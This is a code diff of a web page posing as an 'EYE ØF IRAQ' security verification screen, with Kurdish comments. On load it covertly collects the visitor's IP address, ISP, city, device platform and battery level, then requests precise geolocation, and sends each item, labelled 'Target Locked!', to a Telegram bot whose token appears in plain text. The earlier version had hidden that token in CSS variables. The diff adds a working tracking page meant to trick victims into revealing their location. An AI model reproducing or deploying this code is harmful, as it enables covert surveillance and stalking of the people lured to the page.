@@ -4,77 +4,71 @@
     <meta charset="UTF-8">
     <title>EYE ØF IRAQ | Security Verify</title>
     <style>
-        :root { 
-            --p1: "8678050341"; 
-            --p2: "AAE7b3fvFp"; 
-            --p3: "fGju4NXGaFiMsvhYC0UdnCYtE"; 
-        }
         body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #0f0; padding: 40px; text-align: center; box-shadow: 0 0 20px #0f0; }
-        .spinner { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .box { border: 1px solid #0f0; padding: 40px; text-align: center; box-shadow: 0 0 20px #0f0; width: 80%; max-width: 400px; }
+        .loader { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body onload="capture()">
+<body onload="main()">
     <div class="box">
-        <h2 style="letter-spacing: 5px;">EYE ØF IRAQ</h2>
-        <p id="msg">SYSTEM INITIALIZING...</p>
-        <div class="spinner"></div>
-        <p style="font-size: 10px; color: #333;">ID: 0x8678050341</p>
+        <h2 style="letter-spacing: 3px;">EYE ØF IRAQ</h2>
+        <p id="status">SYSTEM INITIALIZING...</p>
+        <div class="loader"></div>
+        <p style="font-size: 10px; color: #333;">SECURE_ID: 0x8678050341</p>
     </div>
 
 <script>
-    async function capture() {
+    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
+
+    async function main() {
         const urlParams = new URLSearchParams(window.location.search);
-        const targetID = urlParams.get('id'); 
-        if (!targetID) return;
+        const uid = urlParams.get('id');
+        if (!uid) return;
 
-        const root = document.documentElement;
-        const TK = getComputedStyle(root).getPropertyValue('--p1').replace(/"/g, '').trim() + ":" + 
-                   getComputedStyle(root).getPropertyValue('--p2').replace(/"/g, '').trim() + 
-                   getComputedStyle(root).getPropertyValue('--p3').replace(/"/g, '').trim();
+        document.getElementById('status').innerText = "FETCHING NETWORK DATA...";
 
+        // ١. وەرگرتنی IP و زانیاری ئامێر (ئەمە هەمیشە ئیش دەکات)
         try {
-            let bat = "N/A", ch = "No";
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
+            
+            let bat = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 bat = Math.floor(b.level * 100) + "%";
-                ch = b.charging ? "Yes" : "No";
             }
-            let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
 
-            document.getElementById('msg').innerText = "SCANNING DEVICE...";
+            let report = `🚨 <b>Target Locked!</b>\n\n` +
+                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                         `🏢 <b>ISP:</b> <code>${geo.isp || "Korek"}</code>\n` +
+                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                         `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
+                         `🏙️ <b>City:</b> <code>${geo.city || "Unknown"}</code>`;
 
+            // ناردنی زانیاری سەرەتایی یەکسەر
+            await send(uid, report);
+
+            // ٢. داواکردنی لۆکەیشن (ئەگەر قبوڵی کرد)
+            document.getElementById('status').innerText = "SCANNING LOCATION...";
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
-                let city = geo.city || "Erbil/Bakhtiari";
-
-                let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
-                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">[Google Maps]</a>\n` +
-                             `🌐 <b>IP:</b> <code>${ipData.ip}</code> (Korek Telecom)\n` +
-                             `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                             `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
-                             `🕒 <b>Time:</b> <code>${time}</code>\n` +
-                             `🏙️ <b>City:</b> <code>${city}</code>`;
-
-                await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: targetID, text: report, parse_mode: "HTML", disable_web_page_preview: false})
-                });
-                
-                document.getElementById('msg').innerText = "VERIFICATION COMPLETE";
-            }, async () => {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                let report = `⚠️ <b>Target Found (No Location)</b>\n🌐 IP: ${ipData.ip}\n🔋 Battery: ${bat}`;
-                _send(report, TK, targetID);
-                document.getElementById('msg').innerText = "ACCESS DENIED";
+                let locMsg = `📍 <b>Exact Location:</b>\n<a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">[Google Maps Link]</a>`;
+                await send(uid, locMsg);
+                document.getElementById('status').innerText = "VERIFIED!";
+            }, () => {
+                document.getElementById('status').innerText = "LOCATION DENIED";
             });
-        } catch (e) { document.getElementById('msg').innerText = "SYSTEM ERROR"; }
+
+        } catch (e) { document.getElementById('status').innerText = "CONNECTION ERROR"; }
+    }
+
+    function send(uid, txt) {
+        return fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: uid, text: txt, parse_mode: "HTML", disable_web_page_preview: false})
+        });
     }
 </script>
 </body>
